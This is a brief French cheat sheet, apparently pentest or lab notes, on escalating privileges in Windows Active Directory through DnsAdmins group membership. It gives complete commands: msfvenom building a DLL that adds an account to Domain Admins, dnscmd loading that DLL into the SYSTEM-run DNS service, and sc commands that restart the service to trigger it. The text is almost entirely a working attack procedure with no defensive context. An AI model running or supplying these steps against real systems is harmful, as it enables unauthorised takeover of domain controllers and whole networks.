# DnsAdmin Privesc

## DnsAdmin

L'appartenance au groupe DnsAdmin permet l'injection d'un .dll dans le process du serveur DNS. Le service étant géré par l'utilisateur SYSTEM, cette injection permet une privesc.

Génération du .dll:

```bash
msfvenom -p windows/x64/exec cmd='net group "domain admins" netadm /add /domain' -f dll -o adduser.dll
```

Après transfert du .dll, le loader:

```powershell
dnscmd.exe /config /serverlevelplugindll C:\Users\netadm\Desktop\adduser.dll
```

Stopper le service DNS:

```powershell
sc stop dns
```

Lancer le service DNS:

```powershell
sc start dns
```
